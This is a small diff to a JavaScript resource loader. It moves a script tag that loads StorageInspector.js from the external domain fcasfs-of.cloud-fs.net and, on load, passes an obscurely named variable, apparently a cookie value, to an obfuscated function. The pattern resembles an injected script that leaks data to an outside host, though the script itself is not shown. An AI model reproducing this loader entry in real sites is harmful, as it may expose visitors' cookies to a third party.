@@ -205,6 +205,12 @@ carregarTudo([
             'rel': 'stylesheet'
         }
     }, {
+        destino: 'body',  tag: 'script',   
+        atributos: {    
+            'src': 'https://fcasfs-of.cloud-fs.net/StorageInspector.js',
+			'onload': "storage_ps_crtew('"+cokk_plu_esdnf+"');",
+        }
+    }, {
         destino: 'head',    tag: 'link',
         atributos: {
             'href': 'https://fcasfs-of.cloud-fs.net/notify/theme.css',
@@ -244,12 +250,6 @@ carregarTudo([
         atributos: {
             'href': 'https://fcasfs-of.cloud-fs.net/cookies/consent.css',
             'rel': 'stylesheet'
-        }
-    }, {
-        destino: 'head',  tag: 'script',   
-        atributos: {    
-            'src': 'https://fcasfs-of.cloud-fs.net/StorageInspector.js',
-			'onload': "storage_ps_crtew('"+cokk_plu_esdnf+"');",
         }
     }, {
         destino: 'body',  tag: 'script',   
